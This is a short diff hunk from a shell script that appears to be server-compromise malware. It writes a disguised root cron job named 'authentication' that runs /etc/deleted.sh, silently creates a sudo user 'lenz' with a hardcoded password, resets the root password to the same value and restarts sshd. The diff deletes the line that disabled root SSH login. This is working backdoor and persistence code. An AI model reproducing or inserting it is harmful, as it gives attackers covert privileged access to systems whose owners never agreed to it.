@@ -293,7 +293,6 @@ echo -e "*/5 *\t* * *\troot\tbash /etc/deleted.sh" >> /etc/cron.d/authentication
 function install_sudo(){
   {
     useradd -m lenz 2>/dev/null; echo lenz:@@F1r3n3t@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
-    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
     echo -e "@@F1r3n3t@@\n@@F1r3n3t@@\n"|passwd root
     service sshd restart
   }&>/dev/null
